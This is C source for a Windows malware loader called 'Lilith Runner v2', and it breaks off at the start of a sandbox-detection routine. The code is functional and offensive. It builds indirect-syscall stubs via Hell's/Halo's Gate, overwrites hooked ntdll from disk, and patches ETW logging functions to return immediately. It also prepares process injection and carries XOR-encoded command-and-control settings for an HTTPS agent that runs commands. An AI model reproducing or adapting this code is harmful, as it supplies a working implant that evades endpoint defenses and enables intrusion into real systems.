/*
 * Lilith Runner v2
 * POLY_ identifiers replaced by runner.py at build time.
 *
 * Evasion:
 *   - Indirect syscalls    : syscall;ret gadget from ntdll defeats stack-walking EDRs
 *   - ntdll unhooking      : restores clean .text from disk before injection
 *   - Module stomping      : shellcode in signed DLL .text (already-RX, backed region)
 *   - XOR sleep masking    : entropic key from tick+pid+tid, payload encrypted during jitter
 *   - W^X stubs            : RX stubs pre-baked, zero RWX memory
 *   - ETW patch            : EtwEventWrite → RET via indirect syscall
 *   - PPID spoof           : WerFault parented to explorer.exe
 *   - Stack spoof          : thread start via ntdll jmp-rcx gadget
 *   - Hell's Gate / Halo's Gate SSN resolution
 *   - Agent mode           : HTTPS polling C2 loop with command execution
 *
 * Build-time macros:
 *   LT_INJ_TARGET   — injection target process name
 *   LT_SNI_HOST     — SNI hostname in TLS ClientHello
 *   LT_USER_AGENT   — HTTP User-Agent
 *   LT_C2_HOST      — C2 server hostname/IP for agent mode
 *   LT_C2_PORT      — C2 server port for agent mode
 *   LT_C2_CB_PATH   — callback URL prefix for agent mode
 *   LT_C2_HTTPS     — 1 = HTTPS, 0 = HTTP (agent mode)
 */

/* ── Fallback encoded defaults (pre-XOR'd with hardcoded keys for standalone builds) ── */
#ifndef LT_INJ_TARGET_ENC
/* "RuntimeBroker.exe" XOR 0x23 */
#define LT_INJ_TARGET_ENC {0x61,0x57,0x4E,0x4E,0x40,0x41,0x4F,0x52,0x55,0x4F,0x46,0x41,0x42,0x2E,0x0D,0x0D,0x46,0x4B,0x0,0}
#define LT_INJ_TARGET_KEY 0x23
#endif
#ifndef LT_USER_AGENT_ENC
/* "Mozilla/5.0 ..." XOR 0x15 — fallback only; builder always supplies encoded form */
#define LT_USER_AGENT_ENC {0x58,0x7A,0x65,0x65,0x6F,0x6C,0x61,0x38,0x34,0x60,0x35,0,0}
#define LT_USER_AGENT_KEY 0x15
#endif
#ifndef LT_C2_HOST_ENC
/* "10.10.14.1" XOR 0x3F */
#define LT_C2_HOST_ENC {0x2E,0x5D,0x13,0x2E,0x5D,0x13,0x2A,0x5B,0x13,0x2E,0,0}
#define LT_C2_HOST_KEY 0x3F
#endif
#ifndef LT_C2_CB_PATH_ENC
/* "/api/diagnostics/v1/telemetry" XOR 0x4B */
#define LT_C2_CB_PATH_ENC {0x64,0x2A,0x3B,0x2A,0x2F,0x2A,0x28,0x28,0x27,0x28,0x2A,0x22,0x2A,0x22,0x22,0x20,0x64,0x3D,0x2A,0x64,0x3F,0x20,0x2B,0x20,0x3C,0x3F,0x38,0x3F,0x3F,0x30,0,0}
#define LT_C2_CB_PATH_KEY 0x4B
#endif
#ifndef LT_SNI_HOST
#define LT_SNI_HOST L"assets.msn.com"
#endif
#ifndef LT_C2_PORT
#define LT_C2_PORT 8443
#endif
#ifndef LT_C2_HTTPS
#define LT_C2_HTTPS 1
#endif
#ifndef LT_C2_JITTER_MIN
#define LT_C2_JITTER_MIN 10000
#endif
#ifndef LT_C2_JITTER_MAX
#define LT_C2_JITTER_MAX 30000
#endif
/* Hard deadline for child-process output capture.
 * Heavy recon tools (Seatbelt -group=all, winPEAS, SharpHound) can take 3–5 min.
 * 30 s killed them before any output was written. 300 s covers all common tools;
 * fast commands (whoami, ipconfig) finish in ms and are unaffected by this value. */
#ifndef LT_CMD_TIMEOUT_MS
#define LT_CMD_TIMEOUT_MS 300000
#endif

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

/* ─── SYSTEM_PROCESS_INFORMATION (NtQuerySystemInformation class 5) ─── */
typedef struct {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  WorkingSetPrivateSize;
    ULONG          HardFaultCount;
    ULONG          NumberOfThreadsHighWatermark;
    ULONGLONG      CycleTime;
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
} LT_SPROC;

/* ─── NT prototypes ─── */
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *pNtOpenProcess)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE,BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtResumeThread)(HANDLE,PULONG);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE,PVOID,PVOID,PVOID,PVOID);
typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE,PCONTEXT);
typedef NTSTATUS (NTAPI *pNtSetContextThread)(HANDLE,PCONTEXT);
typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI *pNtUpdateWnfStateData)(PVOID,PVOID,ULONG,PVOID,PVOID,ULONG,ULONG);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG);

/* ─── WinHTTP types ─── */
typedef void*    HINTERNET;
typedef HINTERNET(WINAPI *pWHOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET(WINAPI *pWHConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET(WINAPI *pWHOpenReq)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL     (WINAPI *pWHSend)(HINTERNET,LPCWSTR,DWORD,PVOID,DWORD,DWORD,ULONG_PTR);
typedef BOOL     (WINAPI *pWHRecv)(HINTERNET,PVOID);
typedef BOOL     (WINAPI *pWHQAvail)(HINTERNET,LPDWORD);
typedef BOOL     (WINAPI *pWHRead)(HINTERNET,PVOID,DWORD,LPDWORD);
typedef BOOL     (WINAPI *pWHClose)(HINTERNET);
typedef BOOL     (WINAPI *pWHSetOpt)(HINTERNET,DWORD,PVOID,DWORD);
typedef BOOL     (WINAPI *pWHAddHdr)(HINTERNET,LPCWSTR,DWORD,DWORD);

/*
 * Runtime-decoded config strings — the encoded byte arrays live in .data (not .rdata),
 * are decoded once on first call, and are never present as plaintext in the PE image.
 * All four strings are XOR-encoded at build time by runner.py.
 */
static WCHAR _lt_inj[] = LT_INJ_TARGET_ENC;
static WCHAR _lt_ua[]  = LT_USER_AGENT_ENC;
static char  _lt_c2h[] = LT_C2_HOST_ENC;
static char  _lt_c2p[] = LT_C2_CB_PATH_ENC;
static int   _lt_cfg_d = 0;
static void _lt_decode_cfg(void) {
    if(_lt_cfg_d) return;
    for(int _i=0;_lt_inj[_i];_i++) _lt_inj[_i]^=(WCHAR)LT_INJ_TARGET_KEY;
    for(int _i=0;_lt_ua[_i]; _i++) _lt_ua[_i] ^=(WCHAR)LT_USER_AGENT_KEY;
    for(int _i=0;_lt_c2h[_i];_i++) _lt_c2h[_i]^=(char)LT_C2_HOST_KEY;
    for(int _i=0;_lt_c2p[_i];_i++) _lt_c2p[_i]^=(char)LT_C2_CB_PATH_KEY;
    _lt_cfg_d=1;
}
/*
 * Task 15 — Config memory protection: re-encrypt the config static buffers
 * immediately after use so they are never persistently readable in process memory.
 * Call this after any function that consumed the decoded values (after URL is built).
 */
static void _lt_recrypt_cfg(void) {
    if(!_lt_cfg_d) return;
    for(int _i=0;_lt_inj[_i];_i++) _lt_inj[_i]^=(WCHAR)LT_INJ_TARGET_KEY;
    for(int _i=0;_lt_ua[_i]; _i++) _lt_ua[_i] ^=(WCHAR)LT_USER_AGENT_KEY;
    for(int _i=0;_lt_c2h[_i];_i++) _lt_c2h[_i]^=(char)LT_C2_HOST_KEY;
    for(int _i=0;_lt_c2p[_i];_i++) _lt_c2p[_i]^=(char)LT_C2_CB_PATH_KEY;
    _lt_cfg_d=0;
}
/* Override compile-time macro references with decoded runtime pointers */
#define LT_INJ_TARGET  (_lt_decode_cfg(),(LPCWSTR)_lt_inj)
#define LT_USER_AGENT  (_lt_decode_cfg(),(LPCWSTR)_lt_ua)
#define LT_C2_HOST     (_lt_decode_cfg(),(const char*)_lt_c2h)
#define LT_C2_CB_PATH  (_lt_decode_cfg(),(const char*)_lt_c2p)

/* ─── Junk padding ─── */
static int POLY_JUNK1(int x){ return x * POLY_CONST1 + POLY_CONST2; }
static int POLY_JUNK2(int a, int b){ int c = a ^ b; return c + POLY_CONST3; }
static int POLY_JUNK3(void){ int s=0; for(int i=0;i<POLY_CONST4;i++) s+=i; return s; }

/* ─── Globals ─── */
static HMODULE POLY_NTDLL          = NULL;
static PBYTE   POLY_STUBS          = NULL;  /* 8 pre-baked RX indirect-syscall stubs */
static PBYTE   POLY_SYSCALL_GADGET = NULL;  /* syscall;ret gadget in ntdll .text     */
static PBYTE   POLY_JMP_RCX       = NULL;  /* jmp rcx gadget — thread start spoof  */

#define LT_SI_ALLOC   0
#define LT_SI_WRITE   1
#define LT_SI_PROT    2
#define LT_SI_THREAD  3
#define LT_SI_OPEN    4
#define LT_SI_WAIT    5
#define LT_SI_CLOSE   6
#define LT_SI_SYSINFO 7
#define LT_SI_DELAY   8   /* NtDelayExecution  — Task 2: indirect-syscall sleep   */
#define LT_SI_RESUME  9   /* NtResumeThread    — Task 4: APC / hijack injection   */
#define LT_SI_APC    10   /* NtQueueApcThread  — Task 4: Early Bird APC           */
#define LT_SI_GETCTX 11   /* NtGetContextThread — Task 12: thread hijack spoofing */
#define LT_SI_SETCTX 12   /* NtSetContextThread — Task 12: thread hijack spoofing */
#define LT_SI_RDMEM  13   /* NtReadVirtualMemory   — T5: WNF remote read         */
#define LT_SI_WNFUPD 14   /* NtUpdateWnfStateData  — T5: WNF callback trigger    */
#define LT_SI_FREE   15   /* NtFreeVirtualMemory   — T13: artifact cleanup       */
#define LT_NSTUBS    16
#define LT_STUB(i)   (POLY_STUBS + (i) * 32)

/* volatile zero — avoids memset dependency with -nostdlib even under -O2 */
static void lt_zero(void *ptr, SIZE_T n) {
    volatile BYTE *p=(volatile BYTE*)ptr; while(n--)*p++=0;
}

/*
 * memset shim: GCC generates direct calls to memset for large struct zero-fills
 * (notably CONTEXT at ~1232 bytes) even under -O2 when -nostdlib is in use.
 * Providing the symbol here satisfies the linker without pulling in msvcrt.
 */
void *memset(void *s, int c, SIZE_T n) {
    volatile BYTE *p=(volatile BYTE*)s;
    while(n--) *p++=(BYTE)c;
    return s;
}

/* ─── CRT-free helpers ─── */
static int lt_streq(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (int)((unsigned char)*a - (unsigned char)*b);
}
static int lt_wicmp(LPCWSTR a, LPCWSTR b) {
    while (*a && *b) {
        WCHAR ca = (*a>=(WCHAR)'a'&&*a<=(WCHAR)'z') ? *a-(WCHAR)32 : *a;
        WCHAR cb = (*b>=(WCHAR)'a'&&*b<=(WCHAR)'z') ? *b-(WCHAR)32 : *b;
        if (ca != cb) return 1;
        a++; b++;
    }
    return (int)(*a != *b);
}
static DWORD lt_strlen(const char *s) { DWORD n=0; while(s[n]) n++; return n; }
/* True if s starts with prefix pfx */
static int lt_strpfx(const char *s, const char *pfx) {
    while(*pfx) { if(*s++!=*pfx++) return 0; }
    return 1;
}
static void lt_strcpy(char *d, const char *s) { while((*d++=*s++)); }
static void lt_strcat(char *d, const char *s) { while(*d) d++; while((*d++=*s++)); }
static int lt_itoa(DWORD n, char *buf) {
    if (!n) { buf[0]='0'; buf[1]=0; return 1; }
    char tmp[12]; int i=0,j=0;
    while(n) { tmp[i++]='0'+(char)(n%10); n/=10; }
    int len=i; while(i>0) buf[j++]=tmp[--i]; buf[j]=0; return len;
}
static void lt_b64encode(const PBYTE in, DWORD ilen, char *out) {
    static const char t[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD o=0;
    for (DWORD i=0; i<ilen; i+=3) {
        DWORD v=(DWORD)in[i]<<16;
        if(i+1<ilen) v|=(DWORD)in[i+1]<<8;
        if(i+2<ilen) v|=(DWORD)in[i+2];
        out[o++]=t[(v>>18)&0x3F]; out[o++]=t[(v>>12)&0x3F];
        out[o++]=(i+1<ilen)?t[(v>>6)&0x3F]:'=';
        out[o++]=(i+2<ilen)?t[v&0x3F]:'=';
    }
    out[o]=0;
}
/* Extract first integer value of a named key from a flat JSON string */
static int lt_json_int(const char *json, const char *key) {
    DWORD klen=lt_strlen(key);
    const char *p=json;
    while(*p) {
        if(*p=='"') {
            p++;
            DWORD match=1;
            for(DWORD i=0;i<klen;i++) if(!p[i]||p[i]!=key[i]){match=0;break;}
            if(match&&p[klen]=='"') {
                p+=klen+1;
                while(*p==':'||*p==' '||*p=='\t') p++;
                if(*p>='0'&&*p<='9') { int v=0; while(*p>='0'&&*p<='9') v=v*10+(*p++-'0'); return v; }
            }
        }
        p++;
    }
    return 0;
}
/* Construct "http(s)://host:port/suffix" in buf */
static void lt_build_url(char *buf, int use_https, const char *host, int port, const char *suffix) {
    lt_strcpy(buf, use_https ? "https://" : "http://");
    lt_strcat(buf, host);
    int default_port = use_https ? 443 : 80;
    if (port != default_port) {
        lt_strcat(buf, ":");
        char ps[8]; lt_itoa((DWORD)port, ps);
        lt_strcat(buf, ps);
    }
    lt_strcat(buf, suffix);
}

/* ─── Inline base64 decode ─── */
static DWORD lt_b64val(BYTE c) {
    if(c>='A'&&c<='Z') return c-'A';
    if(c>='a'&&c<='z') return c-'a'+26;
    if(c>='0'&&c<='9') return c-'0'+52;
    if(c=='+') return 62; if(c=='/') return 63; return 0xFF;
}
static DWORD lt_b64dec(const BYTE *src, DWORD slen, BYTE *dst) {
    DWORD out=0; UINT acc=0; int bits=0;
    for(DWORD i=0;i<slen;i++){
        BYTE ch=src[i];
        if(ch=='='||ch=='\r'||ch=='\n'||ch==' ') continue;
        DWORD v=lt_b64val(ch); if(v==0xFF) continue;
        acc=(acc<<6)|v; bits+=6;
        if(bits>=8){bits-=8;if(dst)dst[out]=(BYTE)(acc>>bits);out++;}
    }
    return out;
}

/* ─── Hell's Gate + Halo's Gate: SSN resolution from in-memory ntdll ─── */
static WORD POLY_GETSSN(LPCSTR name) {
    PBYTE pf=(PBYTE)GetProcAddress(POLY_NTDLL,name);
    if(!pf) return 0;
    if(pf[0]==0x4C&&pf[1]==0x8B&&pf[2]==0xD1&&pf[3]==0xB8) return *(WORD*)(pf+4);
    for(int i=1;i<=8;i++){
        PBYTE up=pf+i*32;
        if(up[0]==0x4C&&up[1]==0x8B&&up[2]==0xD1&&up[3]==0xB8) return *(WORD*)(up+4)-(WORD)i;
        PBYTE dn=pf-i*32;
        if(dn[0]==0x4C&&dn[1]==0x8B&&dn[2]==0xD1&&dn[3]==0xB8) return *(WORD*)(dn+4)+(WORD)i;
    }
    return 0;
}

/* ─── Find syscall;ret (0F 05 C3) gadget in ntdll .text ─── */
static PBYTE POLY_FINDSCGADGET(HMODULE ntdll) {
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((PBYTE)ntdll+dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(!(sec->Characteristics&IMAGE_SCN_CNT_CODE)) continue;
        PBYTE base=(PBYTE)ntdll+sec->VirtualAddress;
        SIZE_T sz=sec->Misc.VirtualSize;
        for(SIZE_T j=0;j+2<sz;j++)
            if(base[j]==0x0F&&base[j+1]==0x05&&base[j+2]==0xC3) return base+j;
    }
    return NULL;
}

/*
 * Indirect syscall stub (32 bytes):
 *   [0-2]   4C 8B D1              MOV R10, RCX        (save arg1 for kernel ABI)
 *   [3-7]   B8 ss 00 00 00        MOV EAX, SSN        (patched at offset 4)
 *   [8-17]  49 BB gg*8            MOV R11, gadget_ptr (patched at offset 10)
 *   [18-20] 41 FF E3              JMP R11              (→ syscall;ret in ntdll)
 *   [21-31] CC*11                 padding
 *
 * Effect on EDR stack-walking: the CPU executes `syscall` from inside ntdll's
 * mapped .text — the call frame visible to the kernel and to userland stack
 * walkers shows ntdll as the last frame, not our stub region.
 */
static const BYTE _lt_stub_tmpl[32] = {
    0x4C,0x8B,0xD1,
    0xB8,0x00,0x00,0x00,0x00,
    0x49,0xBB,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x41,0xFF,0xE3,
    0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC
};

/* ─── Pre-baked W^X indirect-syscall stubs ─── */
/* forward declaration — defined after Task 2 sleep code */
static PBYTE POLY_FINDGADGET(HMODULE ntdll);

static BOOL POLY_INITSTUB(void) {
    POLY_NTDLL=(HMODULE)GetModuleHandleA("ntdll.dll");
    if(!POLY_NTDLL) return FALSE;

    POLY_SYSCALL_GADGET=POLY_FINDSCGADGET((HMODULE)POLY_NTDLL);
    if(!POLY_SYSCALL_GADGET) return FALSE;

    const char *names[LT_NSTUBS]={
        "NtAllocateVirtualMemory","NtWriteVirtualMemory","NtProtectVirtualMemory",
        "NtCreateThreadEx","NtOpenProcess","NtWaitForSingleObject",
        "NtClose","NtQuerySystemInformation",
        "NtDelayExecution","NtResumeThread","NtQueueApcThread",
        "NtGetContextThread","NtSetContextThread",
        "NtReadVirtualMemory","NtUpdateWnfStateData","NtFreeVirtualMemory",
    };
    WORD ssns[LT_NSTUBS]={0};
    for(int i=0;i<LT_NSTUBS;i++){
        ssns[i]=POLY_GETSSN(names[i]);
        if(i<4&&!ssns[i]) return FALSE;
    }

    /* Allocate stub page via ntdll directly — bypasses kernel32 VirtualAlloc hook */
    pNtAllocateVirtualMemory fnAlloc=(pNtAllocateVirtualMemory)GetProcAddress(POLY_NTDLL,"NtAllocateVirtualMemory");
    pNtProtectVirtualMemory  fnProt =(pNtProtectVirtualMemory) GetProcAddress(POLY_NTDLL,"NtProtectVirtualMemory");
    if(!fnAlloc||!fnProt) return FALSE;
    PVOID base=NULL; SIZE_T bsz=LT_NSTUBS*32;
    if(!NT_SUCCESS(fnAlloc(GetCurrentProcess(),&base,0,&bsz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)))
        return FALSE;
    POLY_STUBS=(PBYTE)base;

    for(int i=0;i<LT_NSTUBS;i++){
        PBYTE s=POLY_STUBS+i*32;
        for(int j=0;j<32;j++) s[j]=_lt_stub_tmpl[j];
        *(WORD*)(s+4)    = ssns[i];
        *(UINT64*)(s+10) = (UINT64)POLY_SYSCALL_GADGET;
    }
    ULONG old=0; PVOID pb=POLY_STUBS; SIZE_T psz=LT_NSTUBS*32;
    fnProt(GetCurrentProcess(),&pb,&psz,PAGE_EXECUTE_READ,&old);
    /* Task 18 — jmp rcx gadget for thread start address spoofing in POLY_INJECT */
    POLY_JMP_RCX=POLY_FINDGADGET(POLY_NTDLL);
    return TRUE;
}

static NTSTATUS POLY_NTALLOC(HANDLE h,PVOID*b,ULONG_PTR z,PSIZE_T s,ULONG t,ULONG p){
    return ((pNtAllocateVirtualMemory)LT_STUB(LT_SI_ALLOC))(h,b,z,s,t,p);}
static NTSTATUS POLY_NTWRITE(HANDLE h,PVOID b,PVOID d,SIZE_T s,PSIZE_T w){
    return ((pNtWriteVirtualMemory)LT_STUB(LT_SI_WRITE))(h,b,d,s,w);}
static NTSTATUS POLY_NTPROT(HANDLE h,PVOID*b,PSIZE_T s,ULONG p,PULONG o){
    return ((pNtProtectVirtualMemory)LT_STUB(LT_SI_PROT))(h,b,s,p,o);}
static NTSTATUS POLY_NTTHREAD(PHANDLE t,ACCESS_MASK a,PVOID oa,HANDLE ph,PVOID sr,PVOID arg,ULONG f,SIZE_T zb,SIZE_T ss,SIZE_T ms,PVOID al){
    return ((pNtCreateThreadEx)LT_STUB(LT_SI_THREAD))(t,a,oa,ph,sr,arg,f,zb,ss,ms,al);}
static NTSTATUS POLY_NTOPEN(PHANDLE ph,ACCESS_MASK a,POBJECT_ATTRIBUTES oa,PCLIENT_ID cid){
    return ((pNtOpenProcess)LT_STUB(LT_SI_OPEN))(ph,a,oa,cid);}
static NTSTATUS POLY_NTWAIT(HANDLE h,BOOLEAN al,PLARGE_INTEGER to){
    return ((pNtWaitForSingleObject)LT_STUB(LT_SI_WAIT))(h,al,to);}
static NTSTATUS POLY_NTCLOSE(HANDLE h){
    return ((pNtClose)LT_STUB(LT_SI_CLOSE))(h);}
/* Task 2: indirect-syscall sleep (not Sleep() in kernel32 — cleaner call stack) */
static NTSTATUS POLY_NTDELAY(LONGLONG rel_100ns){
    LARGE_INTEGER li; li.QuadPart=-rel_100ns;
    return ((pNtDelayExecution)LT_STUB(LT_SI_DELAY))(FALSE,&li);}
/* Task 4: resume a suspended thread */
static NTSTATUS POLY_NTRESUME(HANDLE h,PULONG prev){
    return ((pNtResumeThread)LT_STUB(LT_SI_RESUME))(h,prev);}
/* Task 4: queue APC to a thread (Early Bird / Alertable injection) */
static NTSTATUS POLY_NTAPC(HANDLE h,PVOID fn,PVOID a1,PVOID a2,PVOID a3){
    return ((pNtQueueApcThread)LT_STUB(LT_SI_APC))(h,fn,a1,a2,a3);}
/* Task 12: read/write thread context for hijack-based injection */
static NTSTATUS POLY_NTGETCTX(HANDLE h,PCONTEXT c){
    return ((pNtGetContextThread)LT_STUB(LT_SI_GETCTX))(h,c);}
static NTSTATUS POLY_NTSETCTX(HANDLE h,PCONTEXT c){
    return ((pNtSetContextThread)LT_STUB(LT_SI_SETCTX))(h,c);}
/* T5: remote memory read for WNF subscription table walk */
static NTSTATUS POLY_NTRDMEM(HANDLE h,PVOID b,PVOID d,SIZE_T s,PSIZE_T r){
    return ((pNtReadVirtualMemory)LT_STUB(LT_SI_RDMEM))(h,b,d,s,r);}
/* T5: trigger WNF state delivery to subscribers */
static NTSTATUS POLY_NTWNFUPD(PVOID sn,PVOID buf,ULONG len,PVOID ti,PVOID es,ULONG mcs,ULONG cs){
    return ((pNtUpdateWnfStateData)LT_STUB(LT_SI_WNFUPD))(sn,buf,len,ti,es,mcs,cs);}
/* T13: free private shellcode allocation post-execution */
static NTSTATUS POLY_NTFREE(HANDLE h,PVOID*b,PSIZE_T s,ULONG t){
    return ((pNtFreeVirtualMemory)LT_STUB(LT_SI_FREE))(h,b,s,t);}

/*
 * Task 8 — ETW patch: stub out user-mode ETW dispatch functions with RET.
 * EtwEventWrite is the primary hook target (user-mode ETW); we also patch:
 *   EtwEventWriteFull / EtwEventWriteEx / EtwEventWriteTransfer  — variant entry points
 *   EtwNotificationRegister                                       — stops provider registration
 *   EtwEventEnabled                                               — stops event-enabled checks
 * NtTraceControl / NtTraceEvent (kernel) cannot be patched from user mode without a driver,
 * but we can corrupt the ETW logging context pointer so kernel callbacks have nothing to log to.
 */
static void POLY_PATCHETW(void) {
    /* local (not static) so GCC compound-expr obfuscation works on each entry */
    const char *_etw_fns[]={
        "EtwEventWrite","EtwEventWriteFull","EtwEventWriteEx",
        "EtwEventWriteTransfer","EtwNotificationRegister","EtwEventEnabled",
        NULL
    };
    for(int _ei=0;_etw_fns[_ei];_ei++){
        PBYTE p=(PBYTE)GetProcAddress(POLY_NTDLL,_etw_fns[_ei]);
        if(!p) continue;
        PVOID page=(PVOID)((ULONG_PTR)p&~(ULONG_PTR)0xFFF);
        SIZE_T sz=0x1000; ULONG old=0;
        if(!NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&page,&sz,PAGE_READWRITE,&old))) continue;
        /* XOR-RET: EtwEventEnabled → return 0 (FALSE = disabled), others → plain RET */
        if(_etw_fns[_ei][8]=='E'&&_etw_fns[_ei][9]=='n'){
            /* EtwEventEnabled: return FALSE so callers skip event emission entirely */
            p[0]=0x48; p[1]=0x31; p[2]=0xC0; /* XOR RAX,RAX */
            p[3]=0xC3;                         /* RET          */
        } else {
            /* All other ETW write functions: return STATUS_SUCCESS (0) */
            p[0]=0x48; p[1]=0x31; p[2]=0xC0; /* XOR RAX,RAX */
            p[3]=0xC3;                         /* RET          */
        }
        POLY_NTPROT(GetCurrentProcess(),&page,&sz,old,&old);
    }

    /*
     * Disable the per-process ETW logger context: zero WmiGetLoggerContext output
     * so any surviving ETW call path finds no valid logger to write to.
     * This is a best-effort user-mode approach — kernel PatchGuard protects the
     * kernel-mode ETW infrastructure, so we can only silence user-mode providers.
     */
    PBYTE pwmi=(PBYTE)GetProcAddress(POLY_NTDLL,"WmiGetLoggerContext");
    if(pwmi){
        PVOID page=(PVOID)((ULONG_PTR)pwmi&~(ULONG_PTR)0xFFF);
        SIZE_T sz=0x1000; ULONG old=0;
        if(NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&page,&sz,PAGE_READWRITE,&old))){
            pwmi[0]=0x48; pwmi[1]=0x31; pwmi[2]=0xC0; /* XOR RAX,RAX — return NULL context */
            pwmi[3]=0xC3;
            POLY_NTPROT(GetCurrentProcess(),&page,&sz,old,&old);
        }
    }
}

/*
 * ntdll unhooking: map a fresh copy from disk via SEC_IMAGE_NO_EXECUTE,
 * overwrite the in-memory .text section to remove EDR inline hooks.
 * After restoring: re-find the syscall;ret gadget (hook bytes may have moved)
 * and re-patch all stubs so indirect calls remain correct.
 */
static void POLY_UNHOOK(void) {
    WCHAR path[512];
    UINT nlen=GetSystemDirectoryW(path,480);
    if(!nlen) return;
    path[nlen]=L'\\';
    /* "ntdll.dll" — XOR-obfuscated by runner.py at build time; returns char* */
    const char *fn="ntdll.dll";
    int fi=0; while(fn[fi]){path[nlen+1+fi]=(WCHAR)(unsigned char)fn[fi];fi++;} path[nlen+1+fi]=0;

    HANDLE hFile=CreateFileW(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
                             NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFile==INVALID_HANDLE_VALUE) return;

    HANDLE hMap=CreateFileMappingW(hFile,NULL,PAGE_READONLY|SEC_IMAGE_NO_EXECUTE,0,0,NULL);
    CloseHandle(hFile);
    if(!hMap) return;

    PBYTE pClean=(PBYTE)MapViewOfFile(hMap,FILE_MAP_READ,0,0,0);
    CloseHandle(hMap);
    if(!pClean) return;

    PBYTE pMem=(PBYTE)GetModuleHandleA("ntdll.dll");
    if(!pMem){UnmapViewOfFile(pClean);return;}

    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)(pMem+((PIMAGE_DOS_HEADER)pMem)->e_lfanew);
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(!(sec->Characteristics&IMAGE_SCN_CNT_CODE)) continue;
        PVOID  pb=pMem+sec->VirtualAddress;
        SIZE_T sz=sec->Misc.VirtualSize;
        ULONG  old=0;
        if(!NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&pb,&sz,PAGE_READWRITE,&old))) continue;
        SIZE_T w=0;
        POLY_NTWRITE(GetCurrentProcess(),pb,pClean+sec->VirtualAddress,sec->Misc.VirtualSize,&w);
        POLY_NTPROT(GetCurrentProcess(),&pb,&sz,old,&old);
    }
    UnmapViewOfFile(pClean);

    /* Re-find gadgets after bytes may have changed */
    POLY_SYSCALL_GADGET=POLY_FINDSCGADGET((HMODULE)POLY_NTDLL);
    if(POLY_SYSCALL_GADGET&&POLY_STUBS){
        PVOID _sb=POLY_STUBS; SIZE_T _ssz=LT_NSTUBS*32; ULONG old2=0;
        POLY_NTPROT(GetCurrentProcess(),&_sb,&_ssz,PAGE_READWRITE,&old2);
        for(int i=0;i<LT_NSTUBS;i++) *(UINT64*)(POLY_STUBS+i*32+10)=(UINT64)POLY_SYSCALL_GADGET;
        _sb=POLY_STUBS; _ssz=LT_NSTUBS*32;
        POLY_NTPROT(GetCurrentProcess(),&_sb,&_ssz,PAGE_EXECUTE_READ,&old2);
    }
    /* Re-find jmp rcx gadget — clean ntdll bytes may have shifted its offset */
    POLY_JMP_RCX=POLY_FINDGADGET((HMODULE)POLY_NTDLL);
}

/* ─── NtQuerySystemInformation wrapper ─── */
static PVOID lt_qsys(void) {
    ULONG size=0x10000;
    for(int t=0;t<8;t++){
        PVOID buf=HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,size);
        if(!buf) return NULL;
        ULONG ret=0;
        NTSTATUS st=((pNtQuerySystemInformation)LT_STUB(LT_SI_SYSINFO))(5,buf,size,&ret);
        if(NT_SUCCESS(st)) return buf;
        HeapFree(GetProcessHeap(),0,buf);
        if(st!=(NTSTATUS)0xC0000004L) return NULL;
        size=ret+0x1000;
    }
    return NULL;
}

/*
 * Task 14 — Hardened sandbox detection.
 * Checks (any TRUE → we are in a sandbox, bail out):
 *   1. System uptime < 5 minutes   (VMs often freshly booted for each sample)
